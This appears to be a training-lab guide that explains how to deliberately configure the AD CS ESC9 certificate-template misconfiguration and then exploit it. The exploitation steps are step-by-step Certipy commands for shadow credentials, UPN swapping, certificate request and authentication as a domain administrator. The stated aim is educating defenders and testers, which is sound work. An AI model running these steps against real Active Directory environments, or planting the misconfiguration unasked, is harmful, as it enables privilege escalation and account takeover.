# AD CS ESC9 - A guide on making your AD CS vulnerable to a cool attack

AD CS ESC9 is a cool attack that takes advantage of a certificate template having the no Security Extension flag set on msPKI-EnrollmentFlag. This enables an attacker with write privileges and control of an account with enrollment rights over the vulnerable certificate to change the UPN of the target account to an arbitrary user, like a domain administrator. Once set, the attacker can request a certificate using the vulnerable template with the target account and retrieve a certificate for the UPN the attacker specified. This certificate can then be used to retrieve an NTLM hash for Pass-the-Hash or offline cracking. This misconfiguration may arise from taking improper actions in KB5014754 guidance.

This is an uncommon misconfiguration, but AD CS misconfigurations like ESC1, 3, 4, 8, and 11 are extremely common. This one is just flashy and allows Red Teams to pivot to other accounts and escalate privileges quietly. 

AD CS is extremely important for OTR due to trends encountered throughout the state in Pentests and even on an IR. Educating the training audience on AD CS misconfigurations may help prevent future attacks using these misconfiguration to wreck havoc.

## Dependecies
+ Windows updates on servers May 10, 2022 and September 10, 2025
+ Cetificate Authority Role on Windows Server 2019+
+ user1 with generic write over user2 and an user3 to go for
+ Certipy-AD.
+ The need for speed

## Steps to create the misconfiguration
1. Give user1 generic write of user2
2. Pick a Certificate Template like ```DomainControllerAuthentication```
3. Give user2  enrollment rights. (This account is going to be used to request a certificate for other users.)
4. Set ```CT_FLAG_NO_SECURITY_EXTENSION``` flag in ```msPKI-EnrollmentFlag```
  + ```certutil -dstemplate DomainControllerAuthentication msPKI-Enrollment-Flag +0x00080000```
6. Ensure a user has write privileges over a user with enrollment rights to the vulnerable template.
7. Money.

## Steps to exploit the misconfiguration
1. Retrieve user2's hash with a shadow credentials attack.
   
```certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2```

3. Change the UPN of user2 to an arbitrary user like a Domain Administrator, but do not specify the domain.

```certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3```

4. Request a certificate for user2 using the vulnerable template.

```certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'```

5. Change the UPN of user2 back to the original. 

```certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"```

6. Authenticate with the new certificate.

```certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"```

7. Cash out

## Resources
[The Hacker Recipes](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#no-security-extension-esc9)
